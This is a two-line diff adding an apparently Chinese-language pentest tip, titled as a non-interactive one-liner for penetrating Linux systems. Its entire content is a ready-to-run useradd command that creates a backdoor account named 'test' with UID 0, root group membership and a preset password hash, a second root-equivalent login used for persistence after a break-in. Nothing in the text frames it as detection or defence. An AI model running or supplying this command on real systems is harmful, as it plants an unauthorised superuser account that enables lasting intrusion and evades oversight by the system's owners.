@@ -1,0 +1,2 @@
+渗透linux系统无交互式一句话命令：
+useradd -o -u 0 -g root -G root -d /home/test -p $6$k1MmH6Cv$fRu3N8.zHTnvNP.H9yNngQZ1dIFk2.UZB/1xTfvVHtSdLyOgsX.JrHtpKglaYhl4Io8mb2N6uGLFADblnagkD1 test
